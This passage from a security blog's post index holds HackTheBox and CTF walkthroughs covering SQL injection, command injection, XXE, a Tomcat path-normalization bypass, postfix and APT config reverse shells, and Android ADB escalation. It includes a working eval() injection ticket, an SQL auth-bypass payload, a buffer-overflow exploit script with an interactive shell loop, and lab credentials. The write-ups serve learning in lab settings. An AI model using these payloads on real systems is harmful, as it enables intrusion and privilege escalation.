/etc/apache2/sites-enabled/000-default.conf, which is the default configuration file for Apache2, and will contain the web root. This was a very slow process with sqlmap, so I had to switch to manual SQL queries that use substring() to download chunks of the file, and it worked;And just like that, web root has been identified. The .wsgi is for python web applications, which explains some the difficulties I had enumerating paths earlier. Uploading a .php and a .txt files to the above path didn’t show any error message, but the uploaded files could not be requested. By checking the size of the uploaded files using the length(load_file(&#39;/path/to/file&#39;)), I verified the upload was successful. This is most likely a deadend because all requests to the path are being handled by the writer.wsgi script, and even if I managed to overwrite it, I will need to reboot the Apache server for the script to be loaded again. So I went back to all my previous findings in hope of finding something I missed earlier.The add new story feature in the admin page of the web app is the one thing I haven’t tested before;Going through the request it generated in Burp Suite, I noticed an empty parameter named image_url.  Adding any sort of value to the parameter result in a blank response from the server after it hangs for a few seconds;I needed to view the source code to understand what’s going on. The contents of the apache2 config file for enabled sites/vhosts showed /static path in the web app was mapped to /var/www/writer.htb/writer/static;Since /static is accessible in the web root of the website, that means /var/www/writer.htb/writer will likely be the root of the website. Reading up a bit on how python web apps handle paths, I learned that the file __init__.py is usually used to handle the path mappings of a directory. So I used SQLMap to dump the file, which will be at /var/www/writer.htb/writer/__init__.py in this case, and I got the python source code. Going through it, I found a possible command injection flaw on how the web app handles URL uploads when adding a story in the admin dashboard;The urlib.request.urlretrieve method returns two values, the path to which the given URL has been downloaded, which will be random name inside /tmp, and the headers returned. Notice that the the local_filename is injected directly into a system command used to move the image. Testing the urlretreive() function locally showed that it supports the file:// protocol, and that the returned local_filename when using the file:// protocol is not random, but the absolute path of the file on disk.With the above info, I was able to develop an RCE exploit for the web app after running multiple test locally on my python3 installation. By creating a story on the dashboard and setting the image name to;And the URL upload to;I got a reverse shell after sending the request;UserTwo local users were identified: john and kyle. Kyle got the user flag.Open ports;Going through the source file of the web application, I found a MySQL credential for the web app;The password did not give access to any of the local accounts on the host, nor the SMB service running on the host.Running linPEAS on the host, it found credential for the database named dev;I was able to connect to the dev database using the above credential, and found a hash for the user kyle;john is unable to load the hash when attempting to crack;Using haschat, the password was cracked successfully, which is marcoantonio. Using the credential, I gained access to the account of kyle over ssh;PrivEscUser kyle does not have sudo access on the host. However, he is a member of smbgroup, and filter. Attempting to access the SMB service using his credentials failed. Searching the filesystem for files with group smbgroup and filter, I found an interesting match for the filter group;The file /etc/postfix/disclaimer looks interesting, and I have write permission to it. I had to do a bit of reading online to know what it’s used for. I found out that for any email in /etc/postfix/disclaimer_addresses that send or receive mail, the file /etc/postfix/disclaimer will be executed. There are two (2) emails in the disclaimer_addresses file;This means all I need to do is inject a reverse shell in the disclaimer file, and send a message to any of the listed email addresses to gain code execution. Using nano and netcat, I was able to achieve this after a few tries as the box is restoring the contents of the disclaimer file frequently;The user john has SSH public key authentication configured, so I shipped his private key to my attack host for a more stable access over SSH.JohnI can’t list sudo permissions for this user as I still do not have his password. The user belongs to the group management. Searching for files belonging to the group, I got only one hit;Checking the outputs of pspy, I noticed a possible cron job that’s running apt-get update;After reading up on the purpose of /etc/apt/apt.conf.d, I learned that it is a directory used to store configuration files of APT. The files can be configured with commands be executed by apt on certain conditions. None of the existing files in the directory is writeable. But since all contents of the directory are treated as configuration files, and I have write access to directory, I created a simple configuration file (with a little help from https://blog.ikuamike.io/posts/2021/package_managers_privesc/) that execute a shell command when the apt update command was invoked;I then setup a listener, and wait for the update command to be executed by the cron task. It worked, and I got a reverse shell as root;Summary  Identfied running services using nmap  Found an admin panel by bruteforcing with ffuf  Exploited an SQL Injection flaw to bypass authentication.  Exploited a Command Injection flaw in the Add Story feature to gain a foothold into the box as www-data  Inside the box as www-data;          Found and cracked a hash for kyle in the backend MySQL database used by Django.      The hash gave me access to the box as kyle over SSH.        Inside the box as kyle;          The user belongs to the filter group, and have write permission on the  file /etc/postfix/disclaimer, which get executed when sending/receiving emails to/from certain addresses.      Injected a reverse shell into the file, and gained access to the box as the user john        Inside the box as john;          pspy identified a cron job that performs package update using apt-get update      john belong to the group management, which gave him write access to /etc/apt/apt.conf.d directory.      Created a malicious configuration file in /etc/apt/apt.conf.d that execute a reverse shell command when apt-get update was invoked, and gained access to the box as root.      "
  },
  
  {
    "title": "BountyHunter - HackTheBox",
    "url": "/posts/hackthebox/bountyhunter.html",
    "categories": "hackthebox",
    "tags": "linux, web, xxe, lfi, static analysis, python, command injection, custom exploitation",
    "date": "2021-11-18 00:00:00 +0100",
    
    "snippet": "Another interesting easy linux box, Bounty Hunter is a box that features a web application that is vulnerable to XML External Entitiy injection. This flaw allows an attacker to read local files on the server, which can be used to download a PHP file that contains a username and password, which grants access to box over SSH.The privesc is a CTF-like challenge, where a custom script used to validate “tickets” is making a call to the exec() function of python with user-controlled data.Info  OS - Linux  Difficulty - Easy  Points - 20  Release - 24/Jul/2021  IP - 10.10.11.100ReconStarting Nmap 7.70 ( https://nmap.org ) at 2021-09-26 09:09 WATStats: 0:00:07 elapsed; 0 hosts completed (1 up), 1 undergoing Service ScanService scan Timing: About 50.00% done; ETC: 09:09 (0:00:06 remaining)Nmap scan report for 10.10.11.100Host is up (0.26s latency).PORT   STATE SERVICE VERSION22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernelService detection performed. Please report any incorrect results at https://nmap.org/submit/ .Nmap done: 1 IP address (1 host up) scanned in 9.02 secondsSSH Server  Password login for root user allowed.Web ServerThere is a contact us form at the bottom of the home page that does not send any of the entered data, and result in the below response;The directory /resources/ has listing enabled, and contains a README.txt file;Bounty Report SystemThe form is submitted by a custom JavaScript code defined in the file resources/bountylog.js;function returnSecret(data) {  return Promise.resolve($.ajax({            type: &quot;POST&quot;,            data: {&quot;data&quot;:data},            url: &quot;tracker_diRbPr00f314.php&quot;            }));}async function bountySubmit() {  try {    var xml = `&amp;lt;?xml  version=&quot;1.0&quot; encoding=&quot;ISO-8859-1&quot;?&amp;gt;    &amp;lt;bugreport&amp;gt;    &amp;lt;title&amp;gt;${$(&#39;#exploitTitle&#39;).val()}&amp;lt;/title&amp;gt;    &amp;lt;cwe&amp;gt;${$(&#39;#cwe&#39;).val()}&amp;lt;/cwe&amp;gt;    &amp;lt;cvss&amp;gt;${$(&#39;#cvss&#39;).val()}&amp;lt;/cvss&amp;gt;    &amp;lt;reward&amp;gt;${$(&#39;#reward&#39;).val()}&amp;lt;/reward&amp;gt;    &amp;lt;/bugreport&amp;gt;`    let data = await returnSecret(btoa(xml));      $(&quot;#return&quot;).html(data)  }  catch(error) {    console.log(&#39;Error:&#39;, error);  }}Generated request sample;Nothing in the JavaScript code indicate any input validation, nor  in the HTML code of the form;Since all the user-controlled parameters are directly used to construct and XML code that is passed to the server as a base64-encoded data, XML injection flaws may arise during parsing by the backend.Injecting a new parameter age;The decoded XML;The server only responded with attributes it is interested in, and ignored the injected one, but seeing the title parameter in the response indicated our injection was successful, and didn’t break the backend parser.First attempt to read a local file returned blank attributes;Since the client-side JS code sends out a complete XML code, and not just user-given parameters, the encoded XML data generated was replaced (using an intercepting proxy) with an XML entity that will include a local file in the response;Remote File Inclusion payload also worked;FootholdUsing the XXE vulnerability discovered on the web application, a local user account was discovered with the username codex;Attempt to read the user flag, which should be located at /home/codex/user.txt was unsuccessful.After calling it a night and continuing the next day, the discovered codex user no longer exist in the /etc/passwd file. The account was most likely created by another tester. But the development  account still exist;The flag of this user is also not readable, and attempts to read the source code of the web application in hope of finding something kept kept failing.After a while of frustration, I figured the contents of some files are likely breaking the XML syntax, so I test if the web app allows for base64 encoding of target data using PHP, and it does. The output shown below is the base64-encoded content of /etc/passwd;Since I can now read all readable files, I went back to fuzzing for hidden files with ffuf, and discovered an interesting file in the web root named /db.php;Dumping the file using the XXE exploit revealed a credential;&amp;lt;?php// TODO -&amp;gt; Implement login system with the database.$dbserver = &quot;localhost&quot;;$dbname = &quot;bounty&quot;;$dbusername = &quot;admin&quot;;$dbpassword = &quot;m19RoAU0hP41A1sTsq6K&quot;;$testuser = &quot;test&quot;;?&amp;gt;Since a user was previously discovered with the username development, and an SSH server is running on the host, the password was tested on the SSH server, and it was successful;PrivEscThe user development has sudo access to /opt/skytrain_inc/ticketValidator.py;#Skytrain Inc Ticket Validation System 0.1#Do not distribute this file.def load_file(loc):    if loc.endswith(&quot;.md&quot;):        return open(loc, &#39;r&#39;)    else:        print(&quot;Wrong file type.&quot;)        exit()def evaluate(ticketFile):    #Evaluates a ticket to check for ireggularities.    code_line = None    for i,x in enumerate(ticketFile.readlines()):        if i == 0:            if not x.startswith(&quot;# Skytrain Inc&quot;):                return False            continue        if i == 1:            if not x.startswith(&quot;## Ticket to &quot;):                return False            print(f&quot;Destination: {&#39; &#39;.join(x.strip().split(&#39; &#39;)[3:])}&quot;)            continue        if x.startswith(&quot;__Ticket Code:__&quot;):            code_line = i+1            continue        if code_line and i == code_line:            if not x.startswith(&quot;**&quot;):                return False            ticketCode = x.replace(&quot;**&quot;, &quot;&quot;).split(&quot;+&quot;)[0]            if int(ticketCode) % 7 == 4:                validationNumber = eval(x.replace(&quot;**&quot;, &quot;&quot;))                if validationNumber &amp;gt; 100:                    return True                else:                    return False    return Falsedef main():    fileName = input(&quot;Please enter the path to the ticket file.\\n&quot;)    ticket = load_file(fileName)    #DEBUG print(ticket)    result = evaluate(ticket)    if (result):        print(&quot;Valid ticket.&quot;)    else:        print(&quot;Invalid ticket.&quot;)    ticket.closemain()Code Logic for ticketValidator.py  Ask user for ticket file name.  Verify that the file ends with .md, and open it for reading.  Pass the opened file to evaluate()          Ensure the first line starts with # Skytrain Inc      Ensure the second line starts with ## Ticket to , and print the ticket recipient.      Loop until a line starting with __Ticket Code:__ is found, and save the index of the line after it as code_line.                  Ensure that the line with the index code_line start with **.          Strip the ** found in the line, and split the line at first occurrence of + and save the data to the left as ticketCode.          Convert ticketCode to int, and test if a remainder of 4 is obtained after dividing the value by 7 (ticketCode % 7 == 4).          If the above is true, strip all ** in original code line and pass it to python’s eval() function.                    The eval() method is dangerous when used to process unsanitized data. After testing the logic in a local python3 installation, I was able to build the below ticket that launch a bash shell when processed by the Ticket Validator;# Skytrain Inc## Ticket to someHacker__Ticket Code:__**11 + int(exec(&#39;import os; os.system(&quot;/bin/bash&quot;)&#39;) == 1)Using scp, I copied the above ticket to /tmp/privesc_ticket.md on the target host, and was able to get root on first attempt ;)Summary  Identified SSH and HTTP services using nmap  /log_submit.php provides a form submitted in a POST request as base64-encoded XML with no client-side validation. Testing revealed an exploitable XXE vulnerability.  Using the XXE flaw;          Identified a local user named development.      Download source code of previously discovered PHP file /db.php, which contain password that allowed SSH access to the development account.        With SSH access to the development account;          Found a custom ticket validation script written in python that can be executed as root using sudo.      Shipped the script to my attack host for analysis.                  Discovered a dangerous call to python’s eval() function with user-controlled data.          Crafted a malicious ticket file to spawn a bash shell on the host as root                    "
  },
  
  {
    "title": "Seal - HackTheBox",
    "url": "/posts/hackthebox/seal.html",
    "categories": "hackthebox",
    "tags": "linux, web, apache tomcat, web proxy, git, gitbucket, open signup, path normalization, ansible playbook",
    "date": "2021-11-13 00:00:00 +0100",
    
    "snippet": "Seal is a medium linux box. It features a web service on port 443 running Apache Tomcat, and a GitBucket installation running locally, but accessible through the proxy on port 8080 (nginx). The GitBucket allows a user to create an account, which I did. Once inside, I recovered a password in a previous commit in one of the repositories. This credential was accepted by the tomcat admin login page, but access to the panel was blocked by nginx. This was bypassed thanks to a path normalization vulnerability, and the .war upload used to deploy web applications in tomcat was used to gain code execution on the server.Once inside, two different exploits targeting ansible-playbook were used, first to move laterally, and second to gain code execution as root.InfoReconNMAP# Nmap 7.70 scan initiated Sat Oct  9 15:30:06 2021 as: nmap -sV -sC -p22,443,8080 -oN nmap.txt 10.10.10.250Nmap scan report for seal.htb (10.10.10.250)Host is up (0.71s latency).PORT     STATE SERVICE    VERSION22/tcp   open  ssh        OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)443/tcp  open  ssl/http   nginx 1.18.0 (Ubuntu)|_http-server-header: nginx/1.18.0 (Ubuntu)|_http-title: Seal Market| ssl-cert: Subject: commonName=seal.htb/organizationName=Seal Pvt Ltd/stateOrProvinceName=London/countryName=UK| Not valid before: 2021-05-05T10:24:03|_Not valid after:  2022-05-05T10:24:03| tls-alpn: |_  http/1.1| tls-nextprotoneg: |_  http/1.18080/tcp open  http-proxy| fingerprint-strings: ---[snip]---| http-auth: | HTTP/1.1 401 Unauthorized\\x0D|_  Server returned status 401 but no WWW-Authenticate header.|_http-title: Site doesn&#39;t have a title (text/html;charset=utf-8).1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :---[snip]---SF:);Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernelService detection performed. Please report any incorrect results at https://nmap.org/submit/ .# Nmap done at Sat Oct  9 15:30:45 2021 -- 1 IP address (1 host up) scanned in 38.91 secondsWeb ServiceThe web page looks quite nice for a HTB box, and Wappalyzer detected about 11 web technologies. Going through the links showed that almost all of them are dead.One thing I noticed is the lack of web service running on port 80, but a HTTPs service on port 443. The NMAP scan identified the web server as nginx 1.18.0, but the server was later identified as Apache Tomcat 9.0.31 during manual probing to determine if the server uses PHP;The search field in the homepage generate the below GET request;Continuous fuzzing of the Vegetable parameter showed above made no difference on response received, indicating the web page might be static.Bruteforcing with gobuster failed, citing SSL certificate errors (I later found out that it need the -k argument to disable TLS validation). ffuf worked and discovered some interesting pages;The page /dashboard/ looks promising, but all the links are dead;The response code of 304, which is for unmodified contents and used for caching, indicate it’s probably just a static page;Another page of interest is /admin, which on request redirected me to http://seal.htb/admin/, which failed because the NMAP scan earlier showed no service running on port 80. Since NMAP previously identified a web proxy on port 8080, I enabled this proxy in Firefox using the FoxyProxy plugin, and gained access to the page;Guessing common username and passwords didn’t work. Using the create account link, I created an account with the username testuser and password testpass, and was able to login;Using the repository search feature, I discovered a user named root with 2 repos. Going through the repos of root, I found another user named alex;The seal_market repo owned by root is of interest as it’s contents match that of the web page at https://seal.htb/. It also contains the name of the box, and some administrative todo list in the README file;Another user named luis was also identified while going through this repo, bringing the count of discovered users to 3 (root, luis, and alex).Going through the users homepages, the user  root has the highest entries in activity log. One commit stands out as it mentioned an update to Tomcat’s configuration file;Viewing the commit log showed a credential;Another commit in the seal_market repo showed some config for the nginx reverse proxy with the path /manager/html. Request for /manager forces redirect to /manager/html, which showed a 403 Forbidden response;A bit of googling on the variable $ssl_client_verify showed it is used by nginx to store the result of an SSL certificate verification for the client. Since I am getting a 403, the above config indicate I may have failed the validation or something else. I am not sure. These are all very interesting info, but I have no clue how to exploit them.GitBucketFocusing more on the GitBucker users discovered, I noticed that alex is the admin of the infra repo, luis is a core developer, and root is well… root.Earlier I found a credential for the user tomcat while going through the activity log of the root user. Testing the password against all the three users found, I gained access to the account of luis;No any private repo was found inside Luis’ homepage, and the last activity of the account was on 5 May, which make me believe I am going at it the wrong way.Seal MarketWhile requests for https://seal.htb/dashboard/ succeeded, any other request to a path through Burp Suite gave me the error;Without Burp Suite, request for https://seal.htb/admin/dashboard/ showed 403 Forbidden, while any other path showed the error;Going back to the /manager/ path discovered earlier. I got this very informative error when requesting a random path;Requesting the /manager/text path gave me an authentication prompt;The Tomcat Manager Application prompt made me remember the previous credential obtained from the GitBucket repository, which is tomcat:42MrHBf*z8{Z%. I was able to login using the credential, but got the following message;I imagined the above message is because I am accessing the page from a foreign host, so I tried to use the HTTP proxy on port 8080 to access the page, but it didn’t work.I then started testing the HTTP proxy for HTTP request smuggling attacks, which is an attack I had to learn on the fly, and it didn’t work as the proxy blocks the use of both Content-Length and Transfer-Encoding headers in a single request, which the method I was trying depends on. Some bypass techniques that include adding a whitespace in front of the header name, and a tab in front of the header value, were also detected by the proxy, and blocked;With that method down the drain, I started googling on how to bypass that 403 code. I tried quite a few of the methods, some of which were implemented in scripts hosted on Github, and none worked. I was running out of ideas at this point.I went fully manual using Burp Suite and researching ways to bypass that 403, as I was quite confident this should work due to the presence of the reverse proxy. After lots of trials and errors, I found an article on Acunetix about a path normalization vulnerability when accessing Apache Tomcat using Nginx as a reverse proxy;Using the path /manager/..;/manager/html, which the nginx proxy let through as it does not match it’s rule for /manager/html, and Apache Tomcat normalize to /manager/html, I was able to bypass the 403 error and access the page. AT LAST!!!Tomcat ManagerWith access to the Tomcat Manager, I gained access to a .war file upload functionality;Since .war files are used to package .jsp web apps, I found a webshell on Github, uploaded it, and deployed it on the server;Going to https://seal.htb/webshell gave me a foothold into the box as the tomcat user, which I used to spawn a bash reverse shell back to my attack box;UserWith command execution inside the box as tomcat, it’s time to upgrade to a user account. A local user named luis was found, and inside his home is the user flag which is not readable to us.Moving through the filesystem to find something of interest, I found some directories inside /opt/backups, which are playbook and arhives. The archives contains some .gz archives, while the playbook contains a file named run.yml;- hosts: localhost  tasks:  - name: Copy Files    synchronize: src=/var/lib/tomcat9/webapps/ROOT/admin/dashboard dest=/opt/backups/files copy_links=yes  - name: Server Backups    archive:      path: /opt/backups/files/      dest: &quot;/opt/backups/archives/backup--.gz&quot;  - name: Clean    file:      state: absent      path: /opt/backups/files/Dumping a list of all running processes indicate the program ansible-playbook is being executed by a cron job as luis with the above .yml file as an argument, likely after every 30 seconds judging from the sleep 30 instruction;After reading up a bit about ansible, the above .yml file begins to make sense; It is used to copy all files inside the directory defined in the src parameter into dst, including files pointed to by symbolic links (copy_links=yes).The upper/root part of source directory is not writeable to the tomcat user. Looking at the inner files, however, I noticed the uploads folder is writable to everyone;Since there is a .ssh directory in the home of the user luis, it is likely this user has SSH public key authentication configured, so I moved into the writeable uploads directory and create a symlink to the SSH private key, which will be at /home/luis/.ssh/id_rsa. This is possible because you don’t need any permission on a file before you can create a symlink to it;I then monitor the /opt/backups/archives for a new file to pop up, and one did. I immeditaley copied it /dev/shm/.0 and extract it. Inside the extracted uploads directory, I found the id_rsa file containing the private key of luis;I shipped the key file to my attack host using netcat and gained access to the box over SSH as luis;PrivEscInside the host as luis, I have permission to run /usr/bin/ansible-playbook with any argument as root using sudo. Since this is a standard program, I look it up in https://gtfobins.github.io, and got a hit;Using the above payload, I gained root on the box;This is my fastest privilege escalation on HackTheBox at the time of writing this.Summary  Identified port 22, 443, and 8080 using nmap  Bruteforced the web service on port 443 for hidden paths, and found /dashboard/  Discovered /admin/ web service on port 443, which redirect to http://seal.htb/admin/, which lead me to a GitBucket installation using the proxy on port 8080.  Inside GitBucket;          Found 3 users: root, alex, and luis.      Found a credential for tomcat user. Using the password, gained access to luis account on the GitBucket server.        Used the tomcat credential for a web login at https://seal.htb/manager/text, which succeeded, but access was blocked by nginx reverse proxy.  Expoited a path normalization vulnerability to gain access to /manager/html.  Used the .war file upload functionality to upload a webshell and gain foothold into the box as the user tomcat.  Inside the box as tomcat;          Identified a cron job that uses ansible-playbook and a configuration file to copy files to a directory, resolving all symlinks in the process.      Exploited the copy operation to have ansible-playbook fetch a user’s SSH private key, which I used to gain access to the box over SSH as the user luis.        Inside the box as luis;          Identified a sudo permission to run ansible-playbook with any argument as root.      Found a privilege escalation exploit on https://gtfobins.github.io, which gave me root access to the box.      "
  },
  
  {
    "title": "Synack Red Team 5 CTF",
    "url": "/posts/ctf/synack5.html",
    "categories": "ctf",
    "tags": "ctf, synack red team, hackthebox, jeopardy, template injection, sql injection, command injection, rsa, pwn, traffic analysis, static analysis, reversing",
    "date": "2021-11-08 00:00:00 +0100",
    
    "snippet": "Synack Red Team 5 CTF was (iirc) my third CTF, and the first in which I actually managed to score some decent points. It’s a jeopardy-styled CTF featuring 6 categories (web, pwn, crypto, forensics, misc, and reversing). I managed to solve 16 out of the 25 total challenges, solving at least one challenge in each category. My strongest category was web, in which I solved 5 out of 6 challenges. I eventually finished 46th out of 333 participants, which was narrowly within my target of top 50, and for that I am happy :)WebSimPlayThis was a web challenge with downloadable source code. Going through the source files, the file TimeModel.php was found to be making a call to eval() using user-controlled data that was passed to it by TimeController.phpI exploited this to identify, and read the flag;PotentQuotesThis challenge featured a login form asking for username and password. The username field was vulnerable to SQL Injection, and authentication was bypassed using the payload admin&#39; or 1=1-- -.BoneChewerConeThe website in this challenge was vulnerable to Server Side Template Injection (SSTI). The flag was found in the output of config.items()IMF - LandingThis was a fun web challenge that features Local File Inclusion (LFI) vulnerability in the website served by Nginx. It was a PHP site, and I was able to gain code execution by chaining the LFI with log poisoning to execute PHP payloads;IMF - The SearchThe website in this challenge had a feature that allowed users to search for “agents”. It was NodeJS application, and it’s vulnerable to Server Side Template Injection (SSTI) using the pug engine;Using some node tutorials to execute shell commands, I was able to craft a payload to execute a shell command on the host, but I could not get it to return any output. Attempts to redirect output to local files so I can read it using GET requests were unsuccessful as the server appeared to be only allowing requests to paths with existing mappings.I was eventually able to read output by overwriting the site’s logo, and then viewing it using curl;CryptoWeak RSAThis is a downloadable challenge that provide a public key, and an encrypted message. Using the program https://github.com/Ganapati/RsaCtfTool, and openssl, I was able to decrypt the message after recovering the private key;ReversingAccessThis was a simple reversing challenge that I solved by patching the binary using cutter, forcing it to continuously execute the block of code that compares user input to the hidden key, which I extracted one character at a time;CheckThis challenge provides a binary that compares user input to a value. I was able to solve this by setting a breakpoint where the comparison was carried out, and dumping the data at the memory location using radare2;SplitThe binary in this challenge tests user input against an encrypted string. The encrypted string is decrypted just before the comparison was made, and I was able to dump it by setting a breakpoint at the location;PwnInjectionThis challenge provides a downloadable binary and a TCP service through which the program can be accessed using tools like netcat. The downloaded binary gives an address during interaction with user, which was found to be the address of a buffer used to store user input without checking size, leading to buffer overflow;So I crafted an exploit in python that inject shellcode in the input buffer, and used the given address to overwrite the instruction pointer;#!/usr/bin/python3from time import sleepimport socketfrom binascii import unhexlifyshellcode = open(&quot;dash.bin&quot;, &quot;rb&quot;).read() # A 64-bit /bin/sh shellcodepadding = (&quot;A&quot; * 18).encode()conn = socket.socket()conn.connect((&#39;46.101.21.240&#39;, 31877))print(conn.recv(1024))conn.send(&quot;1\\n&quot;.encode()) # Select the first option# Extract the memory addressdata = str(conn.recv(1024))addr = data.split(&quot;[&quot;)[1].split(&quot;]&quot;)[0]addr = addr[2:]print(addr)rip = unhexlify(addr)[::-1]print(&quot;%r&quot; %(rip))# The final payloadpayload = shellcode + padding + ripconn.send(payload)# Interactive shell for user commands.sleep(1)print(conn.recv(9999))while True:  command = input(&quot;Input &amp;gt; &quot;)  if command:    command += &quot;\\n&quot;    conn.send(command.encode())  print(conn.recv(1024))The above code gave me an interactive command shell on the box;ForensicsSneakyThis was a very easy forensics challenge on a .pcap file. Going through the file in wireshark showed a POST request containing the flag;Top SecretThis challenge featured packet analysis on a .pcap file captured during an FTP transfer of a PDF file. The PDF was extracted using wureshark, and it’s MD5 hash was the flag;Endurance RunThis challenge provides a windows registry file NTUSER.DAT obtained from a hacked computer. Using hivexsh, I was able to locate the flag in the registry, which wasn’t easy because hivexsh has no search feature or even tab auto-complete. I had to used hivexml to convert the whole registry file to an XML, which I then opened on a browser and used the “find” function to locate possible flags. I then used windows cmd prompt running on wine to decode the flag;Phishin ImpossibleThis challenge provides .pdf file that was found to contain an embedded file named secret_info.SettingContent-ms. The file was extracted, and found to contain the flag, which had to be joined from fragments in the powershell command;MiscBlobberThis challenge provides an obfuscated JavaScript file message.js, that uses String.fromCharCode() to load another JavaScript code. The other JavaScript code has a variable named file that was set to a base64-encoded string. Decoding the string, I got a PDF file that contained the flag;ConTextThis challenge provides an obfuscated JavaScript file. It uses a lookup table to decode strings used to reference other things, which I was able to decode using the JS console in Firefox. The JavaScript has a function named flag() that takes a signle string argument, which must be the ID of a 2D canvas in the current page. It uses the canvas to draw an image, which contains the flag for the challenge;So I setup a basic HTML page that loads the script and create a canvas, the ID of which I used to call flag() in the JS console;"
  },
  
  {
    "title": "Explore - HackTheBox",
    "url": "/posts/hackthebox/explore.html",
    "categories": "hackthebox",
    "tags": "android, web, es file explorer, adb, tunneling",
    "date": "2021-10-30 00:00:00 +0100",
    
    "snippet": "Explore is a box that’s first of it’s kind. It is (I think) the first android box ever released on Hack The Box. For foothold, you need to use an exploit for ES File Explorer to read arbitrary files on the device. This will lead you to an image file that contains a credential, which grants access to the box over SSH. Once in, there is an ADB service running locally on port 5555, which you can connect to using the ADB tool and elevate to root.Info  OS - Android  Difficulty - Easy  Points - 20  Release - 26/Jun/2021  IP - 10.10.10.247ReconNmap scan report for 10.10.10.247Host is up (0.25s latency).PORT      STATE    SERVICE VERSION2222/tcp  open     ssh     (protocol 2.0)| fingerprint-strings: |   NULL: |_    SSH-2.0-SSH Server - Banana Studio| ssh-hostkey: |_  2048 71:90:e3:a7:c9:5d:83:66:34:88:3d:eb:b4:c7:88:fb (RSA)5555/tcp  filtered freeciv59777/tcp open     http    Bukkit JSONAPI httpd for Minecraft game server 3.6.0 or older|_http-title: Site doesn&#39;t have a title (text/plain).1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :SF-Port2222-TCP:V=7.70%I=7%D=10/29%Time=617C5151%P=x86_64-pc-linux-gnu%r(NSF:ULL,24,&quot;SSH-2\\.0-SSH\\x20Server\\x20-\\x20Banana\\x20Studio\\r\\n&quot;);Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .Services  SSH server on port 2222  HTTP server on port 59777  Port 5555 - non-responsive.Web ServerBlank web page with no directory listing.Discovered folder init/ showing some error:Fuzzing the init/ folder didn’t reveal anything of importance. However, continuous fuzzing of the root directory with ffuf found some folders;The above marked folders are commonly found in the root of android devices. This was confirmed by making a request to a special folder found in the internal storage of all android devices;Since internal storage is the home of an android user, request to user.txt inside the /sdcard revealed the user flag;FootholdMy initial target of choice for foothold is the SSH server running on port 2222. It has been identified as SSH Server Banana Studio (net.xnano.android.sshserver) in it’s service banner, and provides a username and password login. Google searches lead me to this app;In the descriptions, it says anonymous login with username ssh and blank password is allowed, but that didn’t work on the target;Installing the SSH server on an android device showed that the ssh user need to be enabled, after which I was able to login (to the test android device) with no password;At this point, I went back to recon, and found that the service on port 59777 may actually be an ES File Explorer service after a search on exploitdb showed an exploit that targets port 59777 on android. searchsploit doesn’t have any option to search exploit contents, atleast none that I know of, so I had to use grep on the path where exploitdb store it’s exploits;Using the listFiles command, I was able to list files on the server, but I am not sure the exploit can be used to list a specific directory;Testing the other commands implemented in the exploit, the listPics command showed an interesting file;Requesting the file in a browser, I got the credential kristi:Kr1sT!5h@Rp3xPl0r3!;Using the credential, I was able to get an SSH access on the device;PrivEscQuerying for listening services showed that port 5555, which NMAP reported earlier as filtered, is running;I then setup an SSH tunnel between my attack host and the target to allow access to the service;Port 5555 is the default port used when connecting an android device to an ADB daemon over TCP. Using the ADB client installed on my host, I was able to connect to the service over TCP;Using the su command, root privileges were obtained, and the root flag was found in the /data directory;Summary  Identified running services using NMAP.  Found a web server on port 59777;          Bruteforcing with gobuster reveals a file structure similar to that of android devices.      Obtained user flag at /sdcard/user.txt since /sdcard is the home directory of android users.        Tracked down the application that provide the SSH service running on the host on port 2222, and installed it on an android device for testing.  Found an exploit targetting port 59777 on android devices in exploitdb  Obtained SSH access on the box using the credentials of kristi.  Inside the box as kristi;          Setup an SSH tunnel from my attack host to the target on port 5555, which is the port used by ADB.      Connect to the ADB service using adb installed on my host, and obtained root access using the su command.      "
  },
  
  {
    "title": "Cap - HackTheBox",
    "url": "/posts/hackthebox/cap.html",
    "categories": "hackthebox",
    "tags": "linux, traffic analysis, python, custom exploitation, idor",
    "date": "2021-10-30 00:00:00 +0100",
    
    "snippet": "Cap is a very easy linux box. It has a web service that allows you to view network interfaces as the output of ifconfig, and the ability to briefly capture packets for 5 seconds (and download the .pcap file to your own machine). The URL to download the PCAP file contains a numeric ID, and was found to be vulnerable to an IDOR vulnerability, which I exploited to enumerate previously capture PCAPs, one of which contains a credential for an FTP service, which gave me access to the box over SSH. Once in, I analysed the source code of the web application, and found that it’s performing privileged operations (capturing traffic) without explicitly elevating privileges. The script does not have SUID permissions, which indicate the python interpreter may actually be running as root.Info  OS - Linux  Difficulty - Easy  Points - 20  Release - 05/Jun/2021  IP - 10.10.10.245ReconNMAPWappalyzerThe web app provide an option for downloading pcap files. The path in the menu is /data/8, which contains only one packet. Bruteforcing the number in the URL revealed that /data/6 contains 16 packets.In the navigation menu, there is a Network status option that showed some netstat output, and seemed to be running on the host. It also revealed a possible user named Nathan;Searching Expoit DB using searchsploit indicate the vsftpd service running on the host is vulnerable to a DoS attack. This isn’t something I’m interested in doing.Python GUNICORN Web ServerFootholdThe below URL provide a PCAP for download. On analysis, the capture packets showed many HTTP packets exchanged between my attack host and the target box. This makes sense since at the time of the download, I was using ffuf in the background to bruteforce hidden files on the web root. The PCAPs were generated after making a request to /capture.Through testing, it was found that the packet capture is initiated when the /capture path was requested, and captures packets for 5 seconds. Making the capture request while pinging the host showed some ICMP packets in the PCAP file;The exploit code provided in Exploit DB for the DoS is quite messy and creates a lot of processes that just refuse to die even after I terminated the main process;The packets captured during the DoS attack indicate the FTP server rejecting connections from our host due to too many connections made;This indicate my approach of DoSing out a connected user in hope of capturing authentication packets during reconnection probably won’t work.Every time a request was made to /capture, the web app hangs for 5 seconds (to capture the packets I guess?) and redirect user to /data/&amp;lt;n&amp;gt; (where &amp;lt;n&amp;gt; is a number) to download the captured PCAP. So I decided to bruteforce the number in hope of finding other PCAPs, and the first one yielded an FTP credential nathan:Buck3tH4TF0RM3!;Using the credential, I was able to access the box via SSH and obtain user flag;PrivEscThe nathan user is not allowed sudo access.linPEAS doesn’t yield anything interesting. However, reading the source code of the python web app revelealed an interesting block of code I can probably exploit. It contains the code that captures the packets using 